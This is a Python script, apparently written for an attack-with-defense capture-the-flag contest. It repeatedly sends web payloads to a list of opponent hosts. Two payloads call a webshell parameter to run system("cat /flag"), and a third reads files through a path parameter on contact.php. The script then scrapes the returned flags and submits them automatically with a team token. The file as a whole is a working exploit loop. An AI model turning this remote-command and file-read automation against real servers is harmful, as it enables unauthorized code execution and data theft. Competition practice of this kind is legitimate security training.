import requests
import re
from time import sleep
url = 'http://172.20.1.1/Common/awd_sub_answer'
import pyshark
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}
### 这里填写全场所有人的ip地址 要改！
iplist = ['http://82.157.69.183:10140']
###

### 这里填所有的利用手法
payload1 = '?moxiaoxi=system("cat /flag");'
payload2 = ''
payload2_body = {'moxiaoxi': 'system("cat /flag");'}
payload3 = '/contact.php?path=/flag'
###
def grep_flag(txt):
    match = re.search(r'flag{.*?}', txt)
    if match:
        return match.group(0)

def exp(now_payload, typeof='GET', content=''):
    try:
        if typeof == 'GET':
            r = requests.get(now_payload)
        elif typeof == 'POST':
            r = requests.post(now_payload, data=content)
        elif typeof == 'JSON':
            r = requests.post(now_payload, json=content)
        elif typeof == 'FILE':
            r = requests.post(now_payload, files=content)
        return r.text
    except requests.exceptions.RequestException:
        print('failed: ' + now_payload)
    

def submit_flag(flag, ip):
    if len(flag) != 46:
        return
    r2 = requests.post(url, data={"answer": flag, "token": "这里填咱们队伍的token"})
    if '成功' in r2.text:
        print('[+] attack to %s successfully' % ip)
    else:
        print('[!] attack error on %s' % ip)


if __name__ == '__main__':
    while True:
        for ip in iplist:
            #####
            R = exp(ip + payload1)
            try:
                flag = grep_flag(R)
                print('[*] %s \'s flag is %s' % (ip, flag))
                submit_flag(flag, ip)
            except:
                print('[!] something error in %s' % ip)
            #####
            R = exp(ip + payload2, typeof='POST', content=payload2_body)
            try:
                flag = grep_flag(R)
                print('[*] %s \'s flag is %s' % (ip, flag))
                submit_flag(flag, ip)
            except:
                print('[!] something error in %s' % ip)
            R = exp(ip + payload3, typeof='POST', content=payload2_body)
            try:
                flag = grep_flag(R)
                print('[*] %s \'s flag is %s' % (ip, flag))
                submit_flag(flag, ip)
            except:
                print('[!] something error in %s' % ip)
        sleep(100)